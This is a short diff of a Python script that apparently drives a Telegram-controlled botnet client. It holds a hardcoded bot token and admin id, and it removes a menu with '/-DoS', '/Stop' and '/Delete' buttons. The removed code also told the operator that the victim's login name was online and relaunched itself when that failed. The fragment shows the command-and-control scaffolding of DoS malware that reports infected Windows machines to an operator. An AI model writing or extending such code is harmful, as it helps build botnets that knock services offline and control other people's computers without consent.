@@ -1,5 +1,4 @@
 import telebot, os, time
-from telebot import types
 from ctypes import *
 from ctypes.wintypes import *
 import shutil
@@ -34,22 +33,6 @@ except:
 token = '5013623825:AAERJ6ABD7YoUDc5UwQBnZxK6QdUrE03Md0'
 adm = '666015577'
 bot = telebot.TeleBot(token)
-
-menu = types.ReplyKeyboardMarkup()
-button = types.KeyboardButton('/-DoS\n⭕️')
-button2 = types.KeyboardButton('/Stop\n')
-button3 = types.KeyboardButton('/Check\n')
-button4 = types.KeyboardButton('/Delete\n')
-menu.row(button, button3)
-menu.row(button4, button2)
-
-try:
- bot.send_message(adm, 
- os.getlogin() + ' oнлайн!',
- reply_markup=menu)
-except:
- time.sleep(60)
- os.startfile(sys.argv[0])
 
 
 @bot.message_handler(commands=['Check'])
